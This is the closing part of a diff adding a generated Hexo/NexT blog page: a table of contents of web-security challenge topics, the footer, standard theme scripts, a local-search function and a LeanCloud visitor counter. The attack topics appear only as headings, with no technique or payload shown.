class="nav-link" href="#Directory-traversal"><span class="nav-number">2.17.</span> <span class="nav-text"><a href="#Directory-traversal" class="headerlink" title="Directory traversal"></a>Directory traversal</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#File-upload-null-byte"><span class="nav-number">2.18.</span> <span class="nav-text"><a href="#File-upload-null-byte" class="headerlink" title="File upload - null byte"></a>File upload - null byte</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP-assert"><span class="nav-number">2.19.</span> <span class="nav-text"><a href="#PHP-assert" class="headerlink" title="PHP assert()"></a>PHP assert()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP-filters"><span class="nav-number">2.20.</span> <span class="nav-text"><a href="#PHP-filters" class="headerlink" title="PHP filters"></a>PHP filters</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP-register-globals"><span class="nav-number">2.21.</span> <span class="nav-text"><a href="#PHP-register-globals" class="headerlink" title="PHP register globals"></a>PHP register globals</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#File-upload-ZIP"><span class="nav-number">2.22.</span> <span class="nav-text"><a href="#File-upload-ZIP" class="headerlink" title="File upload - ZIP"></a>File upload - ZIP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Command-injection-Filter-bypass"><span class="nav-number">2.23.</span> <span class="nav-text"><a href="#Command-injection-Filter-bypass" class="headerlink" title="Command injection - Filter bypass"></a>Command injection - Filter bypass</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Local-File-Inclusion"><span class="nav-number">2.24.</span> <span class="nav-text"><a href="#Local-File-Inclusion" class="headerlink" title="Local File Inclusion"></a>Local File Inclusion</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Local-File-Inclusion-Double-encoding"><span class="nav-number">2.25.</span> <span class="nav-text"><a href="#Local-File-Inclusion-Double-encoding" class="headerlink" title="Local File Inclusion - Double encoding"></a>Local File Inclusion - Double encoding</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP-Loose-Comparison"><span class="nav-number">2.26.</span> <span class="nav-text"><a href="#PHP-Loose-Comparison" class="headerlink" title="PHP - Loose Comparison"></a>PHP - Loose Comparison</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP-preg-replace"><span class="nav-number">2.27.</span> <span class="nav-text"><a href="#PHP-preg-replace" class="headerlink" title="PHP preg_replace()"></a>PHP preg_replace()</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">新城瑞雪</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/three/three.min.js"></script>
+
+  
+  <script src="/lib/three/three-waves.min.js"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=6.7.0"></script>
+
+  <script src="/js/src/motion.js?v=6.7.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=6.7.0"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=6.7.0"></script>
+
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=6.7.0"></script>
+<script src="/js/src/post-details.js?v=6.7.0"></script>
+
+
+
+  
+
+
+  <script src="/js/src/bootstrap.js?v=6.7.0"></script>
+
+
+
+  
+
+
+  
+
+
+  
+
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+  
+  <script>
+    
+    function addCount(Counter) {
+      var $visitors = $('.leancloud_visitors');
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+
+      Counter('get', '/classes/Counter', { where: JSON.stringify({ url }) })
+        .done(function({ results }) {
+          if (results.length > 0) {
+            var counter = results[0];
+            
+            Counter('put', '/classes/Counter/' + counter.objectId, JSON.stringify({ time: { '__op': 'Increment', 'amount': 1 } }))
+            
+              .done(function() {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.time + 1);
+              })
+            
+              .fail(function ({ responseJSON }) {
+                console.log(`Failed to save Visitor num, with error message: ${responseJSON.error}`);
+              })
+          } else {
+            
+              var $element = $(document.getElementById(url));
+              $element.find('.leancloud-visitors-count').text('Counter not initialized! More info at console err msg.');
+              console.error('ATTENTION! LeanCloud counter has security bug, see how to solve it here: https://github.com/theme-next/hexo-leancloud-counter-security. \n However, you can still use LeanCloud without security, by setting `security` option to `false`.');
+            
+          }
+        })
+        .fail(function ({ responseJSON }) {
+          console.log(`LeanCloud Counter Error: ${responseJSON.code} ${responseJSON.error}`);
+        });
+    }
+    
+
+    $(function() {
+      $.get('https://app-router.leancloud.cn/2/route?appId=' + 'vSSOfqeDl62sLdrNdF2Kqigh-gzGzoHsz')
+        .done(function({ api_server }) {
+          var Counter = function(method, url, data) {
+            return $.ajax({
+              method: method,
+              url: 'https://' + api_server + '/1.1' + url,
+              headers: {
+                'X-LC-Id': 'vSSOfqeDl62sLdrNdF2Kqigh-gzGzoHsz',
+                'X-LC-Key': 'FKDjLVri4dF3W2GHPq9mP2WR',
+                'Content-Type': 'application/json',
+              },
+              data: data
+            });
+          };
+          
+            addCount(Counter);
+          
+        });
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  <script type="text/javascript" src="/js/src/dynamic_bg.js"></script>
+  <!-- 页面点击小红心 -->
+  <script type="text/javascript" src="/js/src/clicklove.js"></script>
+</body>
+</html>
